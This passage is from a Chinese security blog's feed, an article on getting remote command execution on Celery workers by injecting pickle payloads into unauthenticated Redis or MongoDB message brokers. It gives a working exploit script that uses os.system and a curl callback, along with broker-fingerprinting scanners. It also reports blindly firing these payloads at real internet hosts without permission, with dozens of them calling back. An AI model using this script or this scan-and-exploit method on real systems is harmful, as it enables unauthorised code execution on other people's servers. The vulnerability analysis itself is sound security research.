src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/4.png" alt=""></p><p>历史上框架或者应用由于 Python 反序列化问题导致的任意命令执行并不少见，如 Django 低版本使用了 <code>pickle</code> 作为 Session 数据默认的序列化方式，在设置了使用 Cookie 进行 Session 数据存储的时候，会使得攻击者直接构造恶意 Cookie 值，触发恶意的反序列化进行任意命令执行；又一些程序可接受一串序列化数据作为输入，如 SQLMAP 之前的 <code>--pickled-options</code> 运行参数就可以传入由 <code>pickle</code> 模块序列化后的数据。虽然官方有对 <code>pickle</code> 模块进行安全声明，指明了不要反序列化未受信任的数据来源，但是现实应用逻辑繁杂，常会有这样的数据可控的点出现，也是不太好避免的。</p><h3 id="二、分布式框架-Celery"><a href="#二、分布式框架-Celery" class="headerlink" title="二、分布式框架 Celery"></a>二、分布式框架 Celery</h3><p>回顾完 Python 序列化的问题，这时候转过来看一下 Celery 这个分布式框架。</p><h4 id="1-使用框架进行简单的任务下发"><a href="#1-使用框架进行简单的任务下发" class="headerlink" title="1. 使用框架进行简单的任务下发"></a>1. 使用框架进行简单的任务下发</h4><p>Celery 借助消息队列中间件进行消息（任务）的传递，一个简单利用 Celery 框架进行任务下发并执行的例子：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># celery_simple.py</span></span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line">app = Celery(<span class="string">'demo'</span>, broker=<span class="string">'amqp://192.168.99.100//'</span>, backend=<span class="string">'amqp://192.168.99.100//'</span>)</span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure><p>Celery 推荐使用 RabbitMQ 作为 Broker，这里直接在 <code>192.168.99.100</code> 主机上开启 RabbitMQ 服务，然后在终端使用 celery 命令起一个 worker：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">celery worker -A celery_simple.app -l DEBUG</span><br></pre></td></tr></table></figure><p>然后另起一个 ipython 导入 <code>celery_simple</code> 模块中的 <code>add()</code> 函数，对其进行调用并获取结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In [1]: from celery_simple import add</span><br><span class="line">In [2]: task = add.apply_async((4, 5))</span><br><span class="line">In [3]: task.result</span><br><span class="line">Out[3]: 9</span><br></pre></td></tr></table></figure><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/5.png" alt=""></p><h4 id="2-框架中的消息封装方式"><a href="#2-框架中的消息封装方式" class="headerlink" title="2. 框架中的消息封装方式"></a>2. 框架中的消息封装方式</h4><p>本文并不关心框架的具体实现和用法，只关心消息的具体封装方式。在 Celery 框架中有多种可选的消息序列化方式：</p><ul><li><strong>pickle</strong></li><li>json</li><li>msgpack</li><li>yaml</li><li>…</li></ul><p>可以看到 Celery 框架所使用的消息序列化方式中含有 pickle 的序列化方式，上一部分已经说明了 Python 中 pickle 序列化方式存在的安全隐患，而 Celery 框架却支持这种方式对消息进行封装，并且在 4.0.0 版本以前默认使用的也是 pickle 序列化方式。</p><p>为了弄明白 Celery 的消息格式，这里将 Broker 换成 Redis 方便直接查看数据。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># celery_simple.py</span></span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line">app = Celery(<span class="string">'demo'</span>, broker=<span class="string">'redis://:@192.168.99.100:6379/0'</span>, backend=<span class="string">'redis://:@192.168.99.100:6379/0'</span>)</span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure><p>这里先不起 worker 进程，直接使用 ipython 进行任务下发：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In [1]: from celery_simple import add</span><br><span class="line">In [2]: task = add.apply_async((4, 9))</span><br></pre></td></tr></table></figure><p>这时候查看 Redis 里面的数据：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/6.png" alt=""></p><p>可以看到 Redis 里面存在两个键，<code>celery</code> 和 <code>_kombu.binding.celery</code>，这里解释一下具体两个键的具体含义。在 Celery 中消息可以根据路由设置分发到不同的任务上，例如这里 <code>add()</code> 函数由于没有进行特别的设置，所以其所处的消息队列为名为 <code>celery</code> 的队列，<code>exchange</code> 和 <code>routing_key</code> 值都为 <code>celery</code>，所有满足路由（<code>{&quot;queue&quot;:&quot;celery&quot;,&quot;exchange&quot;:&quot;celery&quot;,&quot;routing_key&quot;:&quot;celery&quot;}</code>）的消息都会发到该 worker 上，然后 worker 根据具体的调用请求去寻找注册的函数使用参数进行调用。 </p><p>而刚刚提到的 Reids 中的键 <code>_kombu.binding.celery</code> 表示存在一个名为 <code>celery</code> 的队列，其 <code>exchange</code> 和 <code>routing_key</code> 的信息保存在该集合里：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/7.png" alt=""></p><p>而键 <code>celery</code> 里面存储的就是每一个 push 到队列里面的具体消息信息：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/8.png" alt=""></p><p>可以看到是一个 JSON 格式的数据，为了更方便的进行字段分析，将其提出来格式化显示为：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"body"</span>: <span class="string">"gAJ9cQAoWAMAAAB1dGNxAYhYAgAAAGlkcQJYJAAAADFkOGZhN2FlLTEyZjYtNDIyOS05ZWI5LTk5ZDViYmI5ZGFiZXEDWAUAAABjaG9yZHEETlgGAAAAa3dhcmdzcQV9cQZYBAAAAHRhc2txB1gRAAAAY2VsZXJ5X3NpbXBsZS5hZGRxCFgIAAAAZXJyYmFja3NxCU5YAwAAAGV0YXEKTlgJAAAAY2FsbGJhY2tzcQtOWAQAAABhcmdzcQxLBEsJhnENWAcAAAB0YXNrc2V0cQ5OWAcAAABleHBpcmVzcQ9OWAkAAAB0aW1lbGltaXRxEE5OhnERWAcAAAByZXRyaWVzcRJLAHUu"</span>,</span><br><span class="line">    <span class="attr">"headers"</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">"content-encoding"</span>: <span class="string">"binary"</span>,</span><br><span class="line">    <span class="attr">"content-type"</span>: <span class="string">"application/x-python-serialize"</span>,</span><br><span class="line">    <span class="attr">"properties"</span>: &#123;</span><br><span class="line">        <span class="attr">"body_encoding"</span>: <span class="string">"base64"</span>,</span><br><span class="line">        <span class="attr">"reply_to"</span>: <span class="string">"c8b55284-c490-3927-85c5-c68a7fed0525"</span>,</span><br><span class="line">        <span class="attr">"correlation_id"</span>: <span class="string">"1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe"</span>,</span><br><span class="line">        <span class="attr">"delivery_info"</span>: &#123;</span><br><span class="line">            <span class="attr">"routing_key"</span>: <span class="string">"celery"</span>,</span><br><span class="line">            <span class="attr">"exchange"</span>: <span class="string">"celery"</span>,</span><br><span class="line">            <span class="attr">"priority"</span>: <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"delivery_mode"</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">"delivery_tag"</span>: <span class="string">"027bd89a-389e-41d1-857a-ba895e6eccda"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的消息数据中，<code>properties</code> 里包含了消息的路由信息和标识性的 UUID 值，而其中<code>properties.body_encoding</code> 的值则表示消息主体 <code>body</code> 的编码方式，这里默认为 base64 编码。在 Celery 分布式框架中，worker 端在获取到消息数据时会根据 <code>properties.body_encoding</code> 的值对消息主体 <code>body</code> 进行解码，即 <code>base64.b64decode(body)</code>，而消息数据中的 <code>content-type</code> 指明了消息主体（具体的任务数据）的序列化方式，由于采用了默认的配置所以这里使用的是 Python 内置序列化模块 <code>pickle</code> 对任务数据进行的序列化。</p><p>将消息主体经 base64 解码和反序列化（即之前 <code>unserializer.py</code> 文件功能） 操作以后得到具体的任务数据：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/9.png" alt=""></p><p>格式化任务数据为：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    'args': (4, 9),  // 传递进 celery_simple.add 函数中的参数</span><br><span class="line">    'timelimit': (None, None),  // celery Task 任务执行时间限制</span><br><span class="line">    'expires': None,</span><br><span class="line">    'taskset': None,</span><br><span class="line">    'kwargs': &#123;&#125;,</span><br><span class="line">    'retries': 0,</span><br><span class="line">    'callbacks': None,  // Task 任务回调</span><br><span class="line">    'chord': None,</span><br><span class="line">    'id': '1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe',  // 任务唯一 ID</span><br><span class="line">    'eta': None,</span><br><span class="line">    'errbacks': None,</span><br><span class="line">    'task': 'celery_simple.add',  // 任务执行的具体方法</span><br><span class="line">    'utc': True</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>任务数据标明了哪一个注册的 Task 将会被调用执行，其执行的参数是什么等等。这里任务数据已经不在重要，从上面这个分析过程中我们已经得到了这么一个结论：Celery 分布式节点 worker 在获取到消息数据后，默认配置下会使用 <code>pickle</code> 对消息主体进行反序列化。</p><h4 id="3-构造恶意消息数据"><a href="#3-构造恶意消息数据" class="headerlink" title="3. 构造恶意消息数据"></a>3. 构造恶意消息数据</h4><p>那么如果在 Broker 中添加一个假任务，其消息主体包含了之前能够进行命令执行的序列化数据，那么在 worker 端对其进行反序列化的时候是不是就能够执行任意代码了呢？下面就来证明这个假设。</p><p>这里直接对消息主体 <code>body</code> 进行构造，根据第一节回顾的 Python 序列化利用方式，构造 Payload 使得在反序列化的时候能够执行命令并将结果进行返回（方便后面验证）：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LS</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (commands.getstatusoutput, (<span class="string">'ls'</span>, ))</span><br><span class="line">print(base64.b64encode(pickle.dumps(LS())))</span><br></pre></td></tr></table></figure><p>运行程序生成具体 Payload 数据：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou</span><br></pre></td></tr></table></figure><p>使用刚才分析过的消息数据，将消息主体的值替换为上面生成的 Payload 得到构造的假消息：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"body"</span>: <span class="string">"Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou"</span>,</span><br><span class="line">    <span class="attr">"headers"</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">"content-encoding"</span>: <span class="string">"binary"</span>,</span><br><span class="line">    <span class="attr">"content-type"</span>: <span class="string">"application/x-python-serialize"</span>,</span><br><span class="line">    <span class="attr">"properties"</span>: &#123;</span><br><span class="line">        <span class="attr">"body_encoding"</span>: <span class="string">"base64"</span>,</span><br><span class="line">        <span class="attr">"reply_to"</span>: <span class="string">"c8b55284-c490-3927-85c5-c68a7fed0525"</span>,</span><br><span class="line">        <span class="attr">"correlation_id"</span>: <span class="string">"1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe"</span>,</span><br><span class="line">        <span class="attr">"delivery_info"</span>: &#123;</span><br><span class="line">            <span class="attr">"routing_key"</span>: <span class="string">"celery"</span>,</span><br><span class="line">            <span class="attr">"exchange"</span>: <span class="string">"celery"</span>,</span><br><span class="line">            <span class="attr">"priority"</span>: <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"delivery_mode"</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">"delivery_tag"</span>: <span class="string">"027bd89a-389e-41d1-857a-ba895e6eccda"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将假消息通过 Redis 命令行直接添加到 <code>celery</code> 队列任务中：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; LPUSH celery <span class="string">'&#123;"body":"Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou","headers":&#123;&#125;,"content-encoding":"binary","content-type":"application/x-python-serialize","properties":&#123;"body_encoding":"base64","reply_to":"c8b55284-c490-3927-85c5-c68a7fed0525","correlation_id":"1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe","delivery_info":&#123;"routing_key":"celery","exchange":"celery","priority":0&#125;,"delivery_mode":2,"delivery_tag":"027bd89a-389e-41d1-857a-ba895e6eccda"&#125;&#125;'</span></span><br></pre></td></tr></table></figure><p>查看一下 <code>celery</code> 队列中的消息情况：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/10.png" alt=""></p><p>然后起一个 Celery worker 端加载之前的 <code>celery_simple.py</code> 中的 APP，worker 会从队列中取消息进行处理，当处理到插入的假消息时，会由于无法解析任务数据而报错：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/11.png" alt=""></p><p>worker 端经过 <code>pickle.loads(base64.b64decode(body))</code> 处理对构造的 Payload 进行的反序列化，由于 Payload 在反序列化时会执行命令并返回执行结构，所以这里 worker 端直接将命令执行的结果当作了任务的具体数据，同时也证明了在 Celery 分布式框架默认配置下（使用了 <code>pickle</code> 序列化方式），进行恶意消息注入会导致 worker 端远程命令执行。</p><h3 id="三、利用脆弱的-Broker-代理进行分布式节点攻击"><a href="#三、利用脆弱的-Broker-代理进行分布式节点攻击" class="headerlink" title="三、利用脆弱的 Broker 代理进行分布式节点攻击"></a>三、利用脆弱的 Broker 代理进行分布式节点攻击</h3><p>前面已经证明了 Celery 构建的应用中，如果攻击者能够控制 Broker 往消息队列中添加任意消息数据，那么即可构造恶意的消息主体数据，使得 worker 端在对其进行反序列化的时候触发漏洞导致任意命令执行。整个流程为：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/12.png" alt=""></p><h3 id="1-检测-Celery-应用中-Broker-特征"><a href="#1-检测-Celery-应用中-Broker-特征" class="headerlink" title="1. 检测 Celery 应用中 Broker 特征"></a>1. 检测 Celery 应用中 Broker 特征</h3><p>那么对于这样一个分布式应用，攻击者是否能够轻易的控制 Broker 呢？在 Celery 支持的消息队列中间件中含有 Reids、MongoDB 这种存在未授权访问问题的服务，因此当一个基于 Celery 框架实现的分布式应用使用了 Redis 或者 MongoDB 作为 Broker 时，极有可能由于中间件未授权访问的问题而被攻击者利用，进行恶意的消息注入。</p><p>所以，如何去寻找既存在未授权访问问题，同时又作为 Celery 分布式应用 Broker 的那些脆弱服务呢？根据上一节的分析，已经得知如果 Redis 作为 Broker 时，其 KEYS 值会存在固定的特征：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_kombu.binding.*</span><br><span class="line">celery.*</span><br><span class="line">unacked.*</span><br></pre></td></tr></table></figure><p>而如果是 MongoDB 作为 Broker，在其数据库中会存在这样的 collections：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">messages</span><br><span class="line">messages.broadcast</span><br><span class="line">messages.routing</span><br></pre></td></tr></table></figure><p>其中 <code>messages.routing</code> 含有每一个队列以及消息路由的信息，<code>messages</code> 则存储了所有队列中的消息数据。</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/13.png" alt=""></p><p>那么就可以根据不同中间件服务的特征去验证一个 Redis 或者 MongoDB 是否作为 Broker 存在于 Celery 分布式应用中。</p><p>针对 Redis 和 MongoDB 可编写出相应的验证脚本，其代码关键部分为：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># celery_broker_redis_check.py</span></span><br><span class="line">...</span><br><span class="line">CELERY_KEYS = [<span class="string">'celery'</span>, <span class="string">'unacked'</span>, <span class="string">'_kombu.binding'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(seed)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip, port = seed.split(<span class="string">':'</span>)</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> ex:</span><br><span class="line">        ip, port = seed, <span class="number">6379</span></span><br><span class="line">    r = redis.Redis(ip, int(port), socket_connect_timeout=<span class="number">5</span>)</span><br><span class="line">    keys = r.keys()</span><br><span class="line">    info = dict(succeed=<span class="keyword">False</span>, keys=list())</span><br><span class="line">    <span class="keyword">for</span> _k <span class="keyword">in</span> CELERY_KEYS:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">            <span class="keyword">if</span> _k <span class="keyword">in</span> key:</span><br><span class="line">                info[<span class="string">'succeed'</span>] = <span class="keyword">True</span></span><br><span class="line">                info[<span class="string">'keys'</span>].append(key)</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>针对未授权的 Redis 服务，直接对所有 KEYS 值进行特征匹配，如果遇到其 KEY 值包含有 <code>[&#39;celery&#39;, &#39;unacked&#39;, &#39;_kombu.binding&#39;]</code> 中任意一个字符串即可判断该服务作为了 Celery 应用的消息队列中间件。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># celery_broker_mongodb_check.py</span></span><br><span class="line">...</span><br><span class="line">CELERY_COLLECTIONS = [<span class="string">'messages.routing'</span>, <span class="string">'messages.broadcast'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(seed)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip, port = seed.split(<span class="string">':'</span>)</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> ex:</span><br><span class="line">        ip, port = seed, <span class="number">27017</span></span><br><span class="line">    conn = pymongo.MongoClient(ip, int(port), connectTimeoutMS=<span class="number">2000</span>,</span><br><span class="line">                               serverSelectionTimeoutMS=<span class="number">2000</span>)</span><br><span class="line">    dbs = conn.database_names()</span><br><span class="line">    info = dict(succeed=<span class="keyword">False</span>, results=dict())</span><br><span class="line">    <span class="keyword">for</span> db <span class="keyword">in</span> dbs:</span><br><span class="line">        colnames = conn.get_database(db).collection_names()</span><br><span class="line">        <span class="keyword">for</span> _col <span class="keyword">in</span> CELERY_COLLECTIONS:</span><br><span class="line">            <span class="keyword">if</span> any(_col <span class="keyword">in</span> colname <span class="keyword">for</span> colname <span class="keyword">in</span> colnames):</span><br><span class="line">                info[<span class="string">'succeed'</span>] = <span class="keyword">True</span></span><br><span class="line">                info[<span class="string">'results'</span>][db] = colnames</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>而由于 Celery 在使用 MongoDB 的时候需要指定数据库，所以需要对存在未授权访问的 MongoDB 中的每一个数据库都进行检测，判断其中的集合名称是否符合条件，若符合即可判断其作为了消息队列中间件。</p><h4 id="2-使用脚本进行消息注入攻击分布式节点"><a href="#2-使用脚本进行消息注入攻击分布式节点" class="headerlink" title="2. 使用脚本进行消息注入攻击分布式节点"></a>2. 使用脚本进行消息注入攻击分布式节点</h4><p>使用上面两个脚本在本地环境进行测试：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/14.png" alt=""></p><p>这里要说明的一个问题就是，不是所有使用了 Celery 分布式框架的应用都配置了 <code>pickle</code> 的序列化方式，<strong>若其只配置了 JSON 等其他安全的序列化方式，则就无法利用 Python 反序列化进行命令执行了</strong>。</p><p>一个简单的真对 Redis Broker 类型的攻击脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># celery_broker_redis_exp.py</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">evil_command = <span class="string">'curl http://127.0.0.1:8000/&#123;&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_evil_task_body</span><span class="params">(command, body_encoding=<span class="string">'base64'</span>)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Command</span><span class="params">(object)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">            <span class="keyword">import</span> os</span><br><span class="line">            <span class="keyword">return</span> (os.system, (command, ))</span><br><span class="line">    <span class="keyword">if</span> body_encoding == <span class="string">'base64'</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(pickle.dumps(Command()))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_evil_message</span><span class="params">(body)</span>:</span></span><br><span class="line">    message = &#123;<span class="string">"body"</span>: body,<span class="string">"headers"</span>: &#123;&#125;,<span class="string">"content-encoding"</span>: <span class="string">"binary"</span>,<span class="string">"content-type"</span>: <span class="string">"application/x-python-serialize"</span>,<span class="string">"properties"</span>: &#123;<span class="string">"body_encoding"</span>: <span class="string">"base64"</span>,<span class="string">"reply_to"</span>: <span class="string">"c8b55284-c490-3927-85c5-c68a7fed0525"</span>,<span class="string">"correlation_id"</span>: <span class="string">"1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe"</span>,<span class="string">"delivery_info"</span>: &#123;<span class="string">"routing_key"</span>: <span class="string">"celery"</span>,<span class="string">"exchange"</span>: <span class="string">"celery"</span>,<span class="string">"priority"</span>: <span class="number">0</span>&#125;,<span class="string">"delivery_mode"</span>: <span class="number">2</span>,<span class="string">"delivery_tag"</span>: <span class="string">"027bd89a-389e-41d1-857a-ba895e6eccda"</span>&#125;&#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(seed)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip, port = seed.split(<span class="string">':'</span>)</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> ex:</span><br><span class="line">        ip, port = seed, <span class="number">6379</span></span><br><span class="line">    r = redis.Redis(ip, int(port), socket_connect_timeout=<span class="number">5</span>)</span><br><span class="line">    keys = r.keys()</span><br><span class="line">    info = dict(succeed=<span class="keyword">False</span>, keys=list())</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">        matched = re.search(<span class="string">r'^_kombu\.binding\.(?P&lt;queue&gt;.*)'</span>, key)</span><br><span class="line">        <span class="keyword">if</span> matched:</span><br><span class="line">            queue_name = matched.group(<span class="string">'queue'</span>)</span><br><span class="line">            message = create_evil_message(</span><br><span class="line">                create_evil_task_body(evil_command.format(queue_name))</span><br><span class="line">            )</span><br><span class="line">            r.lpush(queue_name, message)</span><br><span class="line"></span><br><span class="line">exp(<span class="string">'192.168.99.100'</span>)</span><br></pre></td></tr></table></figure><p>为了测试攻击脚本，首先需要在 <code>192.168.99.100</code> 上开启 Redis 服务并配置为外部可连且无需验证，然后在本地起一个 SimpleHTTPServer 用于接收节点执行命令的请求，最后可直接通过终端配置 Broker 为 Redis 起一个默认的 worker：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">celery worker --broker=&apos;redis://:@192.168.99.100/0&apos;</span><br></pre></td></tr></table></figure><p>整个过程演示：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/15.gif" alt=""></p><p>可以看到通过往消息队列中插入恶意消息，被分布式节点 worker 获取解析后触发了反序列化漏洞导致了远程命令执行。</p><h3 id="四、互联网案例检测"><a href="#四、互联网案例检测" class="headerlink" title="四、互联网案例检测"></a>四、互联网案例检测</h3><p>上一节内容通过实际的代码和演示过程说明了如何通过特征去验证消息队列中间件是否作为了 Celery 分布式框架的一部分，那么互联网中是否真的存在这样的实例呢。这里再次理一下针对 Celery 分布式节点攻击的思路：</p><ol><li>找寻那有着未授权访问且用于 Celery 消息队列传递的中间件服务；</li><li>往消息队列中插入恶意消息数据，因无法确定目标是否允许进行 <code>pickle</code> 方式序列化，所以会进行 Payload 盲打；</li><li>等待分布式节点取走消息进行解析，触发反序列化漏洞执行任意代码；</li></ol><p>首先针对第一点，利用脚本去扫描互联网中存在未授权访问且用于 Celery 消息队列传递的 Redis 和 MongoDB 服务。通过扫描得到未授权访问的 Redis 有 <strong>14000+</strong> 个，而未授权访问的 MongoDB 同样也有 <strong>14000+</strong> 个。</p><p>针对 <strong>14000+</strong> 个存在未授权访问的 Redis 服务使用上一节的验证脚本（<code>celery_broker_redis_check.py</code>）进行批量检测，得到了 <strong>86</strong> 个目标满足要求，扫描过程截图：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/16.png" alt=""></p><p>同样的针对 <strong>14000+</strong> 个存在未授权访问的 MongoDB 服务进行批量检测，得到了 <strong>22</strong> 个目标满足要求，扫描过程截图：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/17.png" alt=""></p><p>根据结果来看，虽然最终满足条件的目标数量并不多，但是这足以说明利用消息注入对分布式节点进行攻击的思路是可行的，并且在消息队列中间件后面有多少个 worker 节点并不知道，危害的不仅仅是 Broker 而是后面的整个节点。</p><p>由于具体的攻击 Payload 使用了盲打，所以不能直接获取远端成功执行命令的结果，所以这里借助外部服务来监听连接请求并进行标识，若一个分布式节点成功触发了漏洞，它会去请求外部服务器。</p><p>针对 Redis 检测过程截图：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/18.png" alt=""></p><p>其中服务器上收到了 <strong>32</strong> 个成功执行命令并回连的请求：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/19.png" alt=""></p><p>同样的针对 MongoDB 检测过程截图：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/20.png" alt=""></p><p>其中服务器上成功收到 <strong>3</strong> 个成功执行命令并回连的请求：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/21.png" alt=""></p><p>从最后得到的数据来看，成功触发漏洞导致远程命令执行的目标数量并不多，而且整个利用条件也比较苛刻，但就结论而言，已经直接解答了文章一开始所提出的疑问，利用多个漏洞对分布式节点进行攻击的思路也成功得到了实践。</p><p><strong>（写了那么多，更多的想把自己平常折腾和研究的一些点给分享出来，理论应用到实战，没有案例的漏洞都不能称之为好漏洞。将一些想法和思路付之于实践，终究会得到验证。）</strong></p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><a href="http://www.celeryproject.org/" target="_blank" rel="noopener">Celery 分布式框架项目 - http://www.celeryproject.org/</a></li><li><a href="https://docs.python.org/2/library/pickle.html" target="_blank" rel="noopener">Python “pickle” 模块文档 - https://docs.python.org/2/library/pickle.html</a></li><li><a href="http://rickgray.me/2015/09/12/django-command-execution-analysis.html">Django 远程命令执行漏洞详解 - http://rickgray.me/2015/09/12/django-command-execution-analysis.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;分布式系统大都需要依赖于&lt;strong&gt;消息队列中间件&lt;/strong&gt;来解决异步处理、应用耦合等问题，&lt;strong&gt;消息队列中间件&lt;/strong&gt;的选择又依赖于整体系统的设计和实现，消息的&lt;strong&gt;封装&lt;/strong&gt;、&lt;strong&gt;传递&lt;/strong&gt;、
      
    
    </summary>
    
      <category term="technology" scheme="http://rickgray.me/categories/technology/"/>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="web" scheme="http://rickgray.me/tags/web/"/>
    
      <category term="python" scheme="http://rickgray.me/tags/python/"/>
    
      <category term="exploit" scheme="http://rickgray.me/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>BlackHat 2016 回顾之 JNDI 注入简单解析</title>
    <link href="http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/"/>
    <id>http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/</id>
    <published>2016-08-18T16:00:00.000Z</published>
    <updated>2018-04-24T15:48:57.518Z</updated>
    
